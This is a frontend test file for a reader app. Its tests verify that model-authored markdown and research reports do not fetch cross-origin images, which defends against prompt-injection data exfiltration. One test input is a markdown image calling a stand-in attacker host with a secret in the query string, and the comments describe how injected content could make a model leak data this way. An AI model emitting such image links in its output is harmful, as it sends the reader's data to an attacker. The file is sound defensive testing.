import { render } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import { MarkdownReader } from '../MarkdownReader'
import { ReadOnlyTiptapReader } from '../ReadOnlyTiptapReader'
import { ReaderWorkspace } from '../../reader/ReaderWorkspace'

/**
 * The reading core renders two different kinds of document, and only one of
 * them may fetch from another host.
 *
 * A captured article's images are part of the article the person chose to
 * read. A Library summary or digest is written by a Run over ingested
 * third-party items, so it is downstream of prompt injection: a cross-origin
 * `<img>` there is fetched with no click, from the reader's IP, to a URL a
 * model chose.
 */

/**
 * ProseMirror inserts an internal `<img class="ProseMirror-separator">` of its
 * own, so "is there an img" is not the question — "what does the browser
 * fetch" is.
 */
function fetchedSources(container: HTMLElement): string[] {
  return [...container.querySelectorAll('img[src]')]
    .map(image => image.getAttribute('src') ?? '')
    .filter(src => src && !src.startsWith('data:'))
}

function imageDoc(src: string) {
  return {
    type: 'doc',
    content: [{ type: 'image', attrs: { src, alt: 'a' } }],
  } as unknown as Record<string, unknown>
}

describe('reader images', () => {
  it('does not load a cross-origin image in model-authored markdown', () => {
    const container = render(<MarkdownReader markdown={'![a](https://evil.example/p.png?d=SECRET)'} />).container
    expect(fetchedSources(container)).toEqual([])
    expect(container.innerHTML).not.toMatch(/src="https:\/\/evil\.example/)
  })

  it('names the host instead, so the person can see what the document pointed at', () => {
    const container = render(<MarkdownReader markdown={'![a](https://evil.example/p.png)'} />).container
    const link = container.querySelector('a[data-external-image]')
    expect(link).not.toBeNull()
    expect(link?.textContent).toContain('evil.example')
    expect(link?.getAttribute('target')).toBe('_blank')
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer')
  })

  it('still renders an image the instance serves itself', () => {
    const container = render(
      <ReadOnlyTiptapReader contentJson={imageDoc('/api/v1/files/x.png')} normalizedText="" />,
    ).container
    expect(fetchedSources(container)).toEqual(['/api/v1/files/x.png'])
  })

  it('loads a captured article’s remote images when the caller asks for them', () => {
    const container = render(
      <ReadOnlyTiptapReader contentJson={imageDoc('https://news.example/photo.jpg')} normalizedText="" remoteImages />,
    ).container
    expect(fetchedSources(container)).toEqual(['https://news.example/photo.jpg'])
  })

  /**
   * `ReaderWorkspace` renders two kinds of document: a captured article, whose
   * images are part of what the person chose to read, and a research report,
   * which a synthesis Run wrote over the same ingested third-party items. The
   * flag therefore belongs to the page, not to the workspace — deciding it
   * there gave both the same answer, and the report's projection emitting no
   * image nodes today is not a property worth resting on.
   */
  it('leaves the choice to the page, and defaults it closed', () => {
    const document = {
      document_type: 'research_report',
      document_id: 'doc-1',
      space_id: 'space-1',
      project_id: 'project-1',
      title: 'Report',
      plain_text: '',
      normalized_text: '',
      content_hash: 'h',
      content_format: 'tiptap_json',
      content_schema_version: 1,
      content_json: imageDoc('https://evil.example/p.png'),
      source_item_id: null,
      artifact_id: null,
    } as never

    const closed = render(
      <ReaderWorkspace document={document} annotations={[]} onAnnotationsChange={() => {}} />,
    ).container
    expect(fetchedSources(closed)).toEqual([])

    const opened = render(
      <ReaderWorkspace document={document} annotations={[]} onAnnotationsChange={() => {}} remoteImages />,
    ).container
    expect(fetchedSources(opened)).toEqual(['https://evil.example/p.png'])
  })

  it('fails closed: a caller that says nothing gets no remote fetch', () => {
    const container = render(
      <ReadOnlyTiptapReader contentJson={imageDoc('https://news.example/photo.jpg')} normalizedText="" />,
    ).container
    expect(fetchedSources(container)).toEqual([])
  })
})
